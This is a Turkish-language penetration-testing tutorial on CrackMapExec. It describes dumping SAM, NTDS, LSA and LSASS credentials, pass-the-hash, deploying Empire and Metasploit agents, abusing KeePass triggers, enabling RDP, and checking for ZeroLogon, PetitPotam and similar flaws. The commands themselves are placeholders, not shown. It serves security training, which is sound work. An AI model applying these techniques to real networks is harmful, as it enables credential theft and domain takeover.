Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


